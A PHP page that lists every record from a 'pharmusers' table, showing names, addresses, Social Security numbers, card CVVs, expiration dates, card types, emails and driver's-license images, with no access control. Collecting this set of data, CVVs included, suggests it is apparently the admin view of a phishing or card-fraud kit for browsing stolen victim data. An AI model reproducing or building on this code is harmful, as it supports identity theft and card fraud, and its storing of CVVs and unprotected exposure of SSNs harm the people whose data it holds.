<!-- user_details.php -->
<?php
include('model/dbconn.php');

// Fetch all users from the database
$sql = "SELECT * FROM pharmusers";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Details</title>
  <!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
</head>
<body>
<div class="container mt-5">
        <h2 class="text-center">Registered User Details</h2>
        <table class="table table-bordered table-striped">
            <thead>
                <tr>
                    <th>User ID</th>
                    <th>Full Name</th>
                    <th>City</th>
                    <th>State</th>
                    <th>Zip Code</th>
                    <th>SSN</th>
                    <th>Age</th>
                    <th>CVV</th>
                    <th>Expiration Date</th>
                    <th>Driver's License</th> <!-- Display as image -->
                    <th>Card Type</th>
                    <th>Email</th>
                </tr>
            </thead>
            <tbody>
                <?php if ($result->num_rows > 0): ?>
                    <?php while ($row = $result->fetch_assoc()): ?>
                        <tr>
                            <td><?= htmlspecialchars($row['user_id']); ?></td>
                            <td><?= htmlspecialchars($row['FullName']); ?></td>
                            <td><?= htmlspecialchars($row['City']); ?></td>
                            <td><?= htmlspecialchars($row['State']); ?></td>
                            <td><?= htmlspecialchars($row['ZipCode']); ?></td>
                            <td><?= htmlspecialchars($row['SSN']); ?></td>
                            <td><?= htmlspecialchars($row['Age']); ?></td>
                            <td><?= htmlspecialchars($row['CVV']); ?></td>
                            <td><?= htmlspecialchars($row['ExpirationDate']); ?></td>
                            <td>
                                <?php
                                // Split file paths if there are multiple images
                                $licenseFiles = explode(',', $row['DriversLicense']);
                                foreach ($licenseFiles as $file) {
                                    echo "<img src='" . htmlspecialchars($file) . "' alt='License Image' style='width: 100px; height: auto; margin: 5px;' />";
                                }
                                ?>
                            </td>
                            <td><?= htmlspecialchars($row['CardType']); ?></td>
                            <td><?= htmlspecialchars($row['Email']); ?></td>
                        </tr>
                    <?php endwhile; ?>
                <?php else: ?>
                    <tr>
                        <td colspan="12" class="text-center">No users found</td>
                    </tr>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
</body>
</html>
